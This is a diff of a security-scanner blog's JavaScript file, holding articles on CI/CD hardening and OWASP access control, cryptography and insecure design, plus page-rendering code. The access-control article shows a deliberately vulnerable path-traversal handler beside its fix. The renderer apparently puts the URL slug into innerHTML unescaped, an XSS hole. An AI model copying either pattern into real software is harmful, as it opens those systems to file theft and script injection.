+<p>Continuous Integration and Continuous Deployment (CI/CD) pipelines have access to your repositories, production API keys, and deployment servers. Compromising a pipeline (e.g. through a malicious GitHub Action or infected npm package) gives attackers full access to your production infrastructure without needing to touch your web application.</p>
+
+<h2 id="github-actions-best-practices">GitHub Actions Best Practices</h2>
+<p>When using GitHub Actions, apply the principle of least privilege:</p>
+<ul>
+  <li><strong>Pin actions to commit hashes:</strong> Never use version tags like <code>uses: actions/checkout@v3</code> because tags can be modified or hijacked. Use <code>uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3</code> (SHA hash).</li>
+  <li><strong>Restrict token permissions:</strong> Set default repository permissions to read-only in your workflow file.</li>
+</ul>
+<pre><code>permissions:
+  contents: read
+  security-events: write</code></pre>
+
+<h2 id="secrets-management">Secrets Management</h2>
+<p>Never hardcode API keys or database credentials in your repository or code. Use encrypted environment secrets provided by GitHub, AWS Secrets Manager, or HashiCorp Vault. Ensure your build logs do not print secrets to the console (log scrubbing).</p>
+
+<h2 id="dependency-audits">Dependency Audits & Supply Chain</h2>
+<p>Modern applications load thousands of third-party packages. Run security checks as a blocking step in your CI/CD pipeline:</p>
+<pre><code><span class="comment"># In your CI pipeline file</span>
+- name: Run security audit
+  run: npm audit --audit-level=high</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // OWASP A01 ACCESS CONTROL
+  // ─────────────────────────────────────────────
+  'owasp-a01': {
+    title: 'OWASP A01:2021 — Broken Access Control Deep Dive',
+    excerpt: 'Broken Access Control is the most common vulnerability category in modern web apps. Learn how to secure directories, paths, API routes, and user data.',
+    tags: [['OWASP A01','tag-red'],['Access Control','tag-purple'],['Deep Dive','tag-cyan']],
+    author: { initials:'SA', name:'Sara Abdi', role:'Security Research Lead', color:'rgba(255,59,92,0.15)', textColor:'var(--red)' },
+    date: 'January 12, 2025', readTime: '11 min read',
+    difficulty: 'intermediate',
+    toc: ['What is access control?','Common bypass examples','Path traversal','Fixing access control','Summary'],
+    relatedSlugs: ['idor-guide','broken-auth-guide','api-security-guide'],
+    content: `
+<h2 id="what-is-access-control">What is Access Control?</h2>
+<p>Access control (or authorization) enforces policies so that users cannot act outside of their intended permissions. **Broken Access Control** is the #1 security risk in the OWASP Top 10. When it fails, attackers can access confidential records, edit other users' profiles, or run administrative tasks.</p>
+
+<h2 id="common-bypass-examples">Common Access Control Bypasses</h2>
+<p>Common bypasses include accessing administrative panels by guessing URL paths (e.g. <code>/admin/dashboard</code>) or accessing objects directly via database identifiers (IDOR).</p>
+
+<h2 id="path-traversal">Path Traversal (File Exposure)</h2>
+<p>A path traversal vulnerability allows attackers to read arbitrary files on the server by supplying dot-dot-slash (<code>../</code>) characters in a file request parameter.</p>
+<pre><code><span class="comment">// Vulnerable Node.js code</span>
+app.get(<span class="string">'/view-file'</span>, (req, res) => {
+  <span class="keyword">const</span> filename = req.query.file;
+  res.sendFile(<span class="danger">'/var/www/uploads/' + filename</span>);
+});</code></pre>
+
+<h2 id="fixing-access-control">Fixing Access Control</h2>
+<p>Always default to deny. Centralize your authorization checks using middle-tier frameworks or policy engines, and never construct filesystem paths directly from user input.</p>
+<pre><code><span class="comment">// Fixed file viewer in Node.js</span>
+<span class="keyword">const</span> path = <span class="keyword">require</span>(<span class="string">'path'</span>);
+app.get(<span class="string">'/view-file'</span>, (req, res) => {
+  <span class="keyword">const</span> safeName = path.basename(req.query.file);
+  <span class="keyword">const</span> safePath = path.resolve(<span class="string">'/var/www/uploads/'</span>, safeName);
+  res.sendFile(safePath);
+});</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // OWASP A02 CRYPTOGRAPHY
+  // ─────────────────────────────────────────────
+  'owasp-a02': {
+    title: 'OWASP A02:2021 — Cryptographic Failures and Data Exposure',
+    excerpt: 'Cryptographic failures are the root cause of large-scale data breaches. Learn how to select secure hashing, configure SSL/TLS, and encrypt sensitive data at rest.',
+    tags: [['OWASP A02','tag-red'],['Cryptography','tag-purple'],['Deep Dive','tag-cyan']],
+    author: { initials:'TN', name:'Tunde Nwosu', role:'Backend Engineer', color:'rgba(255,214,10,0.15)', textColor:'var(--yellow)' },
+    date: 'January 6, 2025', readTime: '10 min read',
+    difficulty: 'intermediate',
+    toc: ['What is A02?','Data in transit vs at rest','Selecting safe hashing algorithms','Encrypting sensitive records','Checklist'],
+    relatedSlugs: ['ssl-tls-guide','what-is-security','http-headers-guide'],
+    content: `
+<h2 id="what-is-a02">What is OWASP A02:2021?</h2>
+<p>OWASP A02 covers failures related to cryptography, which often lead to sensitive data exposure. This includes sending data in plain text, using weak hashing algorithms (like MD5 or SHA1), reusing encryption keys, or using outdated TLS protocols.</p>
+
+<h2 id="data-in-transit-vs-at-rest">Data in Transit vs Data at Rest</h2>
+<ul>
+  <li><strong>Data in Transit:</strong> Data moving across the network. Must be encrypted using TLS 1.2 or 1.3. Any plain HTTP route is a cryptographic failure.</li>
+  <li><strong>Data at Rest:</strong> Data stored in a database or files. Sensitive data (like credit cards, SSNs, and passwords) must be encrypted or hashed.</li>
+</ul>
+
+<h2 id="selecting-safe-hashing-algorithms">Selecting Safe Hashing Algorithms</h2>
+<p>Passwords must never be encrypted (reversible). Instead, they must be hashed using a slow, salted cryptographic hash function. **Never use MD5, SHA1, or SHA256 for password hashing.** They are too fast, making them vulnerable to brute-force cracking using GPUs.</p>
+<div class="ab-highlight success"><div class="ab-highlight-label"> Safe Choice</div><p>Use <strong>bcrypt</strong>, <strong>Argon2</strong>, or <strong>PBKDF2</strong> with a high work factor for password hashing. These are designed to be slow and resistant to hardware cracking.</p></div>
+
+<h2 id="encrypting-sensitive-records">Encrypting Sensitive Records (AES-GCM)</h2>
+<p>For data that needs to be decrypted (like API keys or payment tokens), use authenticated encryption like AES-256-GCM.</p>
+<pre><code><span class="comment">// Node.js safe AES-256-GCM encryption</span>
+<span class="keyword">const</span> crypto = <span class="keyword">require</span>(<span class="string">'crypto'</span>);
+
+<span class="keyword">function</span> encrypt(text, secretKey) {
+  <span class="keyword">const</span> iv = crypto.randomBytes(12);
+  <span class="keyword">const</span> cipher = crypto.createCipheriv(<span class="string">'aes-256-gcm'</span>, secretKey, iv);
+  <span class="keyword">let</span> encrypted = cipher.update(text, <span class="string">'utf8'</span>, <span class="string">'hex'</span>);
+  encrypted += cipher.final(<span class="string">'hex'</span>);
+  <span class="keyword">const</span> authTag = cipher.getAuthTag().toString(<span class="string">'hex'</span>);
+  <span class="keyword">return</span> { encrypted, iv: iv.toString(<span class="string">'hex'</span>), authTag };
+}</code></pre>
+`
+  },
+
+  // ─────────────────────────────────────────────
+  // OWASP A04 INSECURE DESIGN
+  // ─────────────────────────────────────────────
+  'owasp-a04': {
+    title: 'OWASP A04:2021 — Insecure Design: The Root of Web Vulnerabilities',
+    excerpt: 'Web security is not just about fixing code bugs. Insecure Design focuses on architectural flaws and the necessity of threat modeling before coding.',
+    tags: [['OWASP A04','tag-red'],['Architecture','tag-purple'],['Design','tag-yellow']],
+    author: { initials:'AO', name:'Adewale Okonkwo', role:'Founder & CEO', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+    date: 'January 2, 2025', readTime: '7 min read',
+    difficulty: 'easy',
+    toc: ['Design flaws vs implementation bugs','What is threat modeling?','Secure design patterns','Checklist'],
+    relatedSlugs: ['what-is-security','owasp-intro','broken-auth-guide'],
+    content: `
+<h2 id="design-flaws-vs-implementation-bugs">Design Flaws vs. Implementation Bugs</h2>
+<p>A secure design differs from secure coding. You can write 100% bug-free, perfectly written code, but if your design is flawed, your application remains insecure. <strong>Insecure Design</strong> represents architectural deficiencies that cannot be patched with code fixes. They require redesigning the application flow.</p>
+<div class="ab-highlight warning"><div class="ab-highlight-label"> Example Design Flaw</div><p>An e-commerce site allows users to reset passwords by answering security questions. The code checks the answers perfectly. However, the questions can be easily guessed or researched. The design itself is insecure.</p></div>
+
+<h2 id="what-is-threat-modeling">What is Threat Modeling?</h2>
+<p>Threat modeling is a process where developers review the application architecture and ask: <em>"What can go wrong, who would exploit it, and how will we prevent it?"</em> Done during the design phase, it prevents security design flaws from ever reaching the production code.</p>
+
+<h2 id="secure-design-patterns">Secure Design Patterns</h2>
+<p>Always incorporate secure design principles from day one:</p>
+<ul>
+  <li><strong>Least Privilege:</strong> Databases and server processes should run with only the permissions they absolutely need.</li>
+  <li><strong>Segregation of Duties:</strong> Separate administrative features from user-facing modules.</li>
+  <li><strong>Fail Securely:</strong> If an exception occurs, deny access by default rather than letting the user bypass restrictions.</li>
+</ul>
+`
+  }
+};
+
+// ============================================================
+// STUB FOR ARTICLES NOT YET WRITTEN
+// ============================================================
+const ARTICLE_STUB = {
+  title: 'Coming Soon',
+  excerpt: 'This article is currently being written by our security team. Check back soon.',
+  tags: [['Coming Soon','tag-cyan']],
+  author: { initials:'PC', name:'PenChecker Team', role:'Security Research', color:'rgba(0,229,255,0.15)', textColor:'var(--cyan)' },
+  date: '2025', readTime: '—',
+  difficulty: 'easy',
+  toc: [],
+  relatedSlugs: ['sql-injection-guide','http-headers-guide'],
+  content: `
+<div style="text-align:center;padding:60px 0;">
+  <div style="margin-bottom:20px; color: var(--cyan); display: flex; justify-content: center;"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg></div>
+  <h2 style="margin-bottom:12px;">Article Coming Soon</h2>
+  <p style="color:var(--muted2);max-width:420px;margin:0 auto 24px;line-height:1.7;">Our security research team is currently writing this article. It will be published within the next few weeks. Subscribe to our newsletter to be notified when it's live.</p>
+  <a href="../blog.html" style="display:inline-flex;align-items:center;gap:7px;padding:12px 22px;background:var(--cyan);color:var(--black);border-radius:12px;font-weight:700;font-size:0.9rem;text-decoration:none;">← Browse All Articles</a>
+</div>
+`
+};
+
+// ============================================================
+// RENDER ARTICLE
+// ============================================================
+function getArticle(slug) {
+  return ARTICLES[slug] || { ...ARTICLE_STUB, title: `${slug.replace(/-/g,' ')} — Coming Soon` };
+}
+
+function getDifficultyBadge(d) {
+  const map = { easy: [' Beginner Friendly','easy'], intermediate: [' Intermediate','medium'], hard: [' Advanced','hard'] };
+  return map[d] || map['easy'];
+}
+
+function renderArticle(slug) {
+  const art = getArticle(slug);
+  document.title = art.title + ' — PenChecker Blog';
+  document.getElementById('pageDesc').content = art.excerpt;
+
+  // Breadcrumb
+  const breadcrumb = `
+    <div class="article-breadcrumb">
+      <a class="ab-link" href="../index.html">Home</a>
+      <span class="ab-sep">/</span>
+      <a class="ab-link" href="../blog.html">Blog</a>
+      <span class="ab-sep">/</span>
+      <span>${art.title}</span>
+    </div>`;
+
+  // Tags
+  const tagsHtml = art.tags.map(([t,cls]) => `<span class="tag ${cls}">${t}</span>`).join('');
+
+  // Difficulty
+  const [difLabel, difClass] = getDifficultyBadge(art.difficulty || 'easy');
+
+  // Related articles
+  const relatedHtml = (art.relatedSlugs || []).slice(0,4).map(rs => {
+    const rel = ARTICLES[rs];
+    if (!rel) return '';
+    return `<div class="related-card" onclick="window.location.href='article.html?slug=${rs}'">
+      <div class="rc-tag">${(rel.tags[0]||['Article','tag-cyan'])[0]}</div>
+      <div class="rc-title">${rel.title}</div>
+    </div>`;
+  }).join('');
+
+  const mainHtml = `
+    <div class="article-hero">
+      ${breadcrumb}
+      <div class="article-tags">${tagsHtml}</div>
+      <h1 class="article-title">${art.title}</h1>
+      <div class="article-meta">
+        <div class="am-author">
+          <div class="am-avatar" style="background:${art.author.color};color:${art.author.textColor};">${art.author.initials}</div>
+          <div>
+            <div class="am-name">${art.author.name}</div>
+            <div class="am-role">${art.author.role}</div>
+          </div>
+        </div>
+        <div class="am-sep"></div>
+        <div class="am-date" style="display:inline-flex;align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px; vertical-align: middle; opacity: 0.8;"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>${art.date}</div>
+        <div class="am-sep"></div>
+        <div class="am-read" style="display:inline-flex;align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px; vertical-align: middle; opacity: 0.8;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>${art.readTime}</div>
+      </div>
+      <div class="article-excerpt">${art.excerpt}</div>
+    </div>
+    <div class="article-body">${art.content}</div>
+    <div class="article-footer">
+      <div class="af-label">Continue Learning</div>
+      <div class="related-grid">${relatedHtml}</div>
+      <div class="scan-cta">
+        <h4> See this in action on your site</h4>
+        <p>PenChecker scans for all vulnerabilities covered in this article — with verified evidence, not template guesses. Free to start.</p>
+        <a href="../signup.html" class="btn btn-primary">Scan Your Site Free →</a>
+      </div>
+    </div>`;
+
+  document.getElementById('articleMain').innerHTML = mainHtml;
+
+  // Sidebar
+  const sidebar = document.getElementById('articleSidebar');
+  if (sidebar && art.toc && art.toc.length) {
+    const tocItems = art.toc.map((t,i) =>
+      `<a class="toc-item${i===0?' active':''}" href="#" data-idx="${i}">${t}</a>`
+    ).join('');
+    const [difLabel2, difClass2] = getDifficultyBadge(art.difficulty);
+    sidebar.innerHTML = `
+      <div class="sidebar-widget">
+        <div class="sw-title" style="display:flex;align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 6px; vertical-align: middle; color: var(--cyan);"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3.01" y2="6"></line><line x1="3" y1="12" x2="3.01" y2="12"></line><line x1="3" y1="18" x2="3.01" y2="18"></line></svg>On this page</div>
+        <div class="toc-list">${tocItems}</div>
+      </div>
+      <div class="sidebar-widget">
+        <div class="sw-title" style="display:flex;align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 6px; vertical-align: middle; color: var(--cyan);"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>Article Info</div>
+        <div class="difficulty-badge ${difClass2}" style="margin-bottom:8px;">${difLabel2}</div>
+        <div style="font-family:var(--font-mono);font-size:0.72rem;color:var(--muted);margin-top:8px;display:flex;align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 4px; vertical-align: middle; opacity: 0.8;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>${art.readTime}</div>
+      </div>
+      <div class="sidebar-widget" style="background:linear-gradient(135deg,rgba(0,229,255,0.06),rgba(0,255,135,0.04));border-color:var(--border2);">
+        <div style="margin-bottom:10px; color: var(--cyan); display:flex; align-items:center;"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
+        <div style="font-weight:700;font-size:0.9rem;margin-bottom:7px;">Scan your site</div>
+        <p style="font-size:0.78rem;color:var(--muted2);margin-bottom:14px;line-height:1.6;">Find real vulnerabilities — not template findings.</p>
+        <a href="../signup.html" class="btn btn-primary" style="width:100%;justify-content:center;font-size:0.82rem;padding:10px;">Start Free →</a>
+      </div>`;
+    sidebar.style.display = 'block';
+  }
+}
+
+// ============================================================
+// TOC SCROLL TRACKING
+// ============================================================
+function initTOC() {
+  const tocLinks = document.querySelectorAll('.toc-item');
+  const headings = document.querySelectorAll('.article-body h2, .article-body h3');
+  if (!headings.length) return;
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(t => t.classList.remove('active'));
+        // Match heading text to TOC
+        const txt = e.target.textContent.toLowerCase();
+        tocLinks.forEach(t => {
+          if (t.textContent.toLowerCase().includes(txt.substring(0,20))) t.classList.add('active');
+        });
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  headings.forEach(h => obs.observe(h));
+}
+
+// ============================================================
+// NOT FOUND PAGE
+// ============================================================
+function showNotFound(slug) {
+  document.getElementById('articleMain').innerHTML = `
+    <div class="not-found">
+      <div class="nf-icon" style="color: var(--red); margin-bottom: 20px; display: flex; justify-content: center;"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div>
+      <div class="nf-title">Article not found</div>
+      <div class="nf-msg">We couldn't find an article with the slug "<code style="font-family:var(--font-mono);font-size:0.85rem;background:var(--surface);padding:2px 8px;border-radius:5px;">${slug}</code>". It may not exist yet or the URL may be incorrect.</div>
+      <a href="../blog.html" class="btn btn-primary">← Back to Blog</a>
+    </div>`;
+}
+
+
+// ============================================================
+// ASK AI BUTTON — inject into rendered article
+// ============================================================
+function injectAskAiButton(){
+  var articleBody = document.querySelector('.article-body');
+  if(!articleBody) return;
+  var btn = document.createElement('div');
+  btn.style.cssText = 'margin:36px 0 0;padding:24px;background:linear-gradient(135deg,rgba(168,85,247,0.12),rgba(0,229,255,0.08));border:1px solid rgba(168,85,247,0.25);border-radius:14px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;';
+  var title = document.querySelector('.article-title');
+  var titleText = title ? title.textContent.trim().substring(0,100) : 'this security topic';
+  var q = encodeURIComponent('Help me understand and fix issues related to: ' + titleText);
+  btn.innerHTML = '<div><div style="font-weight:700;font-size:1rem;margin-bottom:4px;"> Have questions about this topic?</div><div style="font-size:0.85rem;color:var(--muted2);">Ask the PenChecker AI — get plain-English explanations and fix code for your exact stack.</div></div><a href="../dashboard-ai.html?q='+q+'" style="display:inline-flex;align-items:center;gap:8px;padding:10px 22px;background:var(--purple,#a855f7);color:#fff;border-radius:8px;font-weight:600;font-size:0.9rem;text-decoration:none;white-space:nowrap;flex-shrink:0;">Ask AI Assistant →</a>';
+  articleBody.appendChild(btn);
+}
+
+// ============================================================
+// INIT
+// ============================================================
+const slug = new URLSearchParams(window.location.search).get('slug');
+if (slug) {
+  renderArticle(slug);
+  setTimeout(initTOC, 100);
+  setTimeout(injectAskAiButton, 200);
+} else {
+  showNotFound('(no slug provided)');
+}
+</script>
+</body>
+</html>
